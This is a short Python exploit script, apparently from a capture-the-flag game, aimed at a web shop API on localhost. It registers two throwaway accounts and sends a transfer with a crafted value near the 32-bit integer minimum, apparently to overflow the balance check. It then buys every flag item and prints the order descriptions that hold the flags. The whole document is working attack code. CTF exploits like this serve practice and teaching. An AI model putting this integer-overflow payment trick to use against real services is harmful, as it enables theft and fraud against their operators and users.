#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests, uuid

url = 'http://localhost:9090/api/'

flags = requests.get(url + 'get_flags').json()

sender = str(uuid.uuid4().hex)
receiver = str(uuid.uuid4().hex)

requests.post(url + 'register', json={'username' : sender, 'password' : sender})
requests.post(url + 'register', json={'username': receiver, 'password': receiver})

s = requests.Session()
s.post(url + 'login', json={'username': sender, 'password': sender})

for flag in flags['flags']:
    s.post(url + 'send', json={'receiver' : receiver, 'value' : -2147483647 + 20, 'msg' : 'lucky624'}).json()
    s.post(url + 'buy', json={'name' : flag['name']}).json()

response = s.get(url + 'get_orders').json()

for order in response['orders']:
    print(order['description'])


